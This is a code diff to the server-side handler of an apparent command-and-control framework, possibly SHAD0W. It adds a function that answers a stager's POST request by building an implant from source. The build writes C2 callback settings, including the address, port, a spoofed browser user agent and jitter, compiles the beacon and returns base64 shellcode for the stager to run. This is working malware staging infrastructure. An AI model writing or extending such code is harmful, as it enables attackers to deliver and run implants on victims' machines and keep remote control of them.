@@ -2,6 +2,7 @@ import sys
 from datetime import datetime
 
 from lib import tools
+from lib import buildtools
 from .responce_builder import Builder
 
 DATA_CMD_OUT = 0x2000
@@ -117,6 +118,56 @@ class Handler(object):
             else:
                 self.shad0w.debug.log("invaild http method for register")
                 return self.builder.build(blank=True)
+    
+    def stage_beacon(self, request):
+        # this will be hit when a stager is requesting a beacon. We will need to parse
+        # the request for the beacon and generate the correct one, once this is done we
+        # will to to send it back to the stager.
+
+        # a stager should request a beacon via a post request
+        if request.method == "POST":
+
+            # get the payload from the request
+            payload = request.form['payload']
+
+            # get the variables for the make
+            arch, platform, secure, static = buildtools.get_payload_variables(payload, warn=False)
+
+            # copy the correct source files into build directory
+            if static is not None:
+                # then we are building a static beacon
+                buildtools.clone_source_files(asm=True)
+            if static is None:
+                # the we are building a stager
+                buildtools.clone_source_files(asm=True, rootdir="stager")
+
+            # change the settings file based on the args we been given
+
+            # these settings should be given by the stager in its request
+            settings_template = """#define _C2_CALLBACK_ADDRESS L"%s"
+#define _C2_CALLBACK_PORT %s
+#define _CALLBACK_USER_AGENT L"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
+#define _CALLBACK_JITTER %s000
+""" % (self.shad0w.endpoint, self.shad0w.addr[1], 1)
+
+            buildtools.update_settings_file(None, custom_template=settings_template)
+
+            # now we need to run 'make' inside the cloned dir
+            self.shad0w.debug.spinner(f"Preparing stage...")
+            buildtools.make_in_clone(arch=arch, platform=platform, secure=secure, static=static)
+            self.shad0w.debug.stop_spinner = True
+
+            # get the shellcode from the payload
+            rcode = buildtools.extract_shellcode(want_base64=True)
+
+            # give the shellcode to the stager
+            self.shad0w.debug.log(f"Sending stage {self.shad0w.endpoint} --> {request.remote_addr} ({len(rcode)} bytes)", log=True)
+            return rcode
+        
+        else:
+            self.shad0w.debug.log("invaild http method for stager")
+            return self.builder.build(blank=True)
+
 
     def blank_page(self):
         # does what the function says
